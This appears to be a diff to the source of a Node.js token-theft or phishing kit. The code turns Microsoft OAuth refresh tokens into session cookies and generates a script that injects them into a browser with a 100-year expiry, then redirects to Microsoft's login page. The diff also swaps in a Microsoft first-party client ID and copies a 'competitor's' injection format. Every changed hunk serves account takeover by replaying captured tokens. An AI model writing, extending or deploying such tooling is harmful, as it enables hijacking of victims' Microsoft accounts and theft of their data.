@@ -10,7 +10,7 @@ const db = require('../database/connection');
 const config = require('../config/env');
 
 // Microsoft OAuth2 client configuration
-const CLIENT_ID = config.AZURE_CLIENT_ID || '712eb7f1-10bc-4dc4-8eb5-8f9b71b4c4a9';
+const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const TENANT = config.AZURE_TENANT || 'common';
 
 // Token endpoint URLs for different tenant types
@@ -39,8 +39,8 @@ async function convertTokensToCookies(accessToken, templateType, tenant, email, 
       return { success: false, error: 'Invalid access token provided', cookies: null };
     }
 
-    // Detect OAuth2 refresh token format
-    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R') || accessToken.length > 100;
+    // Detect OAuth2 refresh token format - only accept valid Microsoft refresh token prefixes
+    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R');
     if (!isOAuth2RefreshToken) {
       return {
         success: false,
@@ -256,7 +256,7 @@ async function fetchCookiesFromEndpoint(cookieList, url, accessToken) {
 
 /**
  * Format cookies for browser injection with 100-year expiry
- * Returns a single string suitable for document.cookie assignment
+ * Returns individual cookie strings suitable for document.cookie assignment
  */
 function formatCookiesForInjection(cookies) {
   const cookieStrings = [];
@@ -284,7 +284,7 @@ function formatCookiesForInjection(cookies) {
     cookieStrings.push(cookieStr);
   }
 
-  return cookieStrings.join('; ');
+  return cookieStrings; // Return array of individual cookie strings
 }
 
 /**
@@ -292,7 +292,7 @@ function formatCookiesForInjection(cookies) {
  * This script runs in the user's browser to set all cookies
  */
 function generateCookieInjectionScript(cookies) {
-  if (!cookies || !cookies.success || !cookies.cookies) {
+  if (!cookies || !cookies.success || !cookies.cookies || cookies.cookies.length === 0) {
     return '';
   }
 
@@ -300,46 +300,36 @@ function generateCookieInjectionScript(cookies) {
   expiryDate.setFullYear(expiryDate.getFullYear() + 100);
   const expiresStr = expiryDate.toUTCString();
 
-  // Build individual cookie setting statements
-  const cookieStatements = [];
-  const cookieArray = cookies.cookies.split('; ');
-
-  for (const rawCookie of cookieArray) {
-    const parts = rawCookie.split(';');
-    const nameValue = parts[0].trim();
-    const eqIdx = nameValue.indexOf('=');
-    if (eqIdx <= 0) continue;
-
-    const name = nameValue.substring(0, eqIdx).trim();
-    const value = nameValue.substring(eqIdx + 1).trim();
-
-    if (!name || !value) continue;
-
-    // Determine domain from cookie
+  // Build the actual injection statements using the format the competitor uses
+  let statement = '';
+  cookies.cookies.forEach(function(cookieStr) {
+    // Parse each cookie string into components
+    const parts = cookieStr.split('; ');
+    const nameValue = parts[0];
+    const [name, value] = nameValue.split('=');
+    
     let domainAttr = '';
+    let samesiteAttr = 'SameSite=None';
+    
     for (let i = 1; i < parts.length; i++) {
       const part = parts[i].trim();
       if (part.startsWith('domain=')) {
         const d = part.substring(7).trim();
-        if (d) domainAttr = `; domain=${d}`;
+        domainAttr = `; domain=${d}`;
+      } else if (part.startsWith('samesite=')) {
+        samesiteAttr = part;
       }
     }
+    
+    statement += `document.cookie = "${name}=${value}${domainAttr}; expires=${expiresStr}; path=/; ${samesiteAttr}; secure";\n`;
+  });
 
-    cookieStatements.push(
-      `document.cookie="${name}=${value}${domainAttr}; expires=${expiresStr}; path=/; SameSite=None; secure";`
-    );
-  }
-
-  // Return a script that sets cookies AND stores them for later use
   return `<script>
 (function(){
-  var cookies=[${cookieArray.map(function(c){return '"'+c.replace(/"/g,'\\"')+'"'}).join(',')}];
-  var expiry=new Date();expiry.setFullYear(expiry.getFullYear()+100);var exp=expiry.toUTCString();
-  for(var i=0;i<cookies.length;i++){
-    try{document.cookie=cookies[i]+'; expires='+exp+'; path=/; SameSite=None; secure'}catch(e){}
-  }
-  window.__VG_COOKIES_SET=true;
-  console.log('[VGenius] '+cookies.length+' cookies injected successfully');
+${statement}
+setTimeout(() => {
+  window.location.href = "https://login.microsoftonline.com/?auth=2";
+}, 3000);
 })();
 <\/script>`;
 }
